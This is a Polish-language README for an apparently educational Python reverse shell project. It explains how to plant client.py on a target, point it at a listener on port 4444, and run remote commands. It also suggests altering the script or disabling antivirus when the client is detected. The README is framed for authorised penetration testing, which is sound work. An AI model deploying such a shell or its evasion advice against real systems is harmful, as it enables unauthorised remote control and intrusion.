
Reverse Shell Tool
📖 Opis
To repozytorium zawiera przykład implementacji narzędzia typu reverse shell, stworzonego w celach edukacyjnych oraz do przeprowadzania legalnych testów penetracyjnych. Reverse shell pozwala na zdalne zarządzanie komputerem poprzez połączenie inicjowane przez system docelowy.

🎯 Cel projektu
Edukacja w zakresie bezpieczeństwa IT.
Zrozumienie, jak działają narzędzia używane w testach penetracyjnych.
Praktyka w tworzeniu prostych narzędzi sieciowych.
🛡️ Ważne ostrzeżenie
To narzędzie powinno być używane wyłącznie:

W kontrolowanych środowiskach testowych.
Za zgodą właściciela systemu, na którym jest używane.
Użycie tego narzędzia do nielegalnych celów może być sprzeczne z prawem i skutkować odpowiedzialnością karną. Autor nie ponosi odpowiedzialności za niewłaściwe użycie tego oprogramowania.

⚙️ Funkcjonalność
Klient: Uruchamiany na systemie docelowym, łączy się z serwerem i wykonuje przesyłane komendy.
Serwer: Nasłuchuje połączeń od klienta, wysyła polecenia i odbiera odpowiedzi.
📋 Wymagania
Python 3.x
System operacyjny: Windows/Linux/MacOS
Uprawnienia sieciowe umożliwiające połączenie między klientem a serwerem.

🚀 Jak uruchomić

1. Uruchom serwer
Na komputerze testowym (Twoim):
Skopiuj kod
python3 server.py


2. Uruchom klienta
Na systemie docelowym:
Skopiuj kod
python3 client.py


📝 Przykład użycia
Serwer nasłuchuje na porcie 4444.
Klient łączy się z serwerem, otwierając powłokę umożliwiającą przesyłanie komend.
Wpisz komendę w serwerze (np. ls lub whoami), a odpowiedź zostanie przesłana z klienta.
🛠️ Zastosowanie
Testy penetracyjne: Sprawdzenie, czy system docelowy ma odpowiednie zabezpieczenia.
Edukacja: Nauka o technikach i metodach stosowanych w testach bezpieczeństwa.
📚 Materiały dodatkowe
OWASP Testing Guide
Hack The Box
TryHackMe
⚠️ Zastrzeżenia
Używaj tego narzędzia zgodnie z prawem.
Kod został stworzony wyłącznie w celach edukacyjnych.
Sprawdź przepisy obowiązujące w Twoim kraju dotyczące testów penetracyjnych.








Jak uruchomić na komputerze klienta

1. Przygotowanie środowiska
Na docelowym komputerze musi być zainstalowany Python 3.x. Jeśli nie jest zainstalowany, możesz go pobrać i zainstalować ze strony Python.org.

2. Skopiowanie skryptu klienta na komputer docelowy
Skopiuj plik client.py na komputer, na którym ma działać reverse shell.
Możesz użyć pendrive'a, sieci lokalnej, dysku chmurowego (np. Google Drive), lub pobrać plik z repozytorium GitHub.
Jeśli repozytorium jest publiczne, możesz pobrać je za pomocą polecenia git clone:
Skopiuj kod
git clone https://github.com/techwikr/Reverse-shell-w-pythonie

Otwórz terminal lub wiersz poleceń na komputerze docelowym i przejdź do folderu zawierającego client.py.

3. Konfiguracja klienta
Otwórz plik client.py w edytorze tekstowym.
Zmień adres IP i port na te, które odpowiadają Twojemu serwerowi:
python
Skopiuj kod
reverse_shell("192.168.1.100", 4444)  # Zamień 192.168.1.100 na swój adres IP

4. Uruchomienie serwera
Na swoim komputerze (serwer):

Uruchom plik server.py:

Skopiuj kod
python3 server.py

Upewnij się, że zapora sieciowa (firewall) na Twoim komputerze oraz router pozwalają na nasłuchiwanie na wybranym porcie (np. 4444).
5. Uruchomienie klienta na komputerze docelowym

Na komputerze docelowym uruchom klienta:


Skopiuj kod
python3 client.py

Po uruchomieniu klient nawiąże połączenie z Twoim serwerem, a Ty będziesz mógł przesyłać komendy.

6. Test połączenia
Na swoim serwerze wpisz komendę, np. ls (Linux/macOS) lub dir (Windows), aby zobaczyć listę plików w katalogu na komputerze docelowym.
Odpowiedź powinna pojawić się w terminalu serwera.

7. Zabezpieczenia i uwagi
Firewall i NAT: Jeśli serwer i klient znajdują się w różnych sieciach, może być konieczne skonfigurowanie przekierowania portów (port forwarding) na routerze serwera.
Antywirus: Niektóre programy antywirusowe mogą wykryć i zablokować działanie klienta. W takim przypadku należy dostosować skrypt lub wyłączyć antywirus w środowisku testowym.

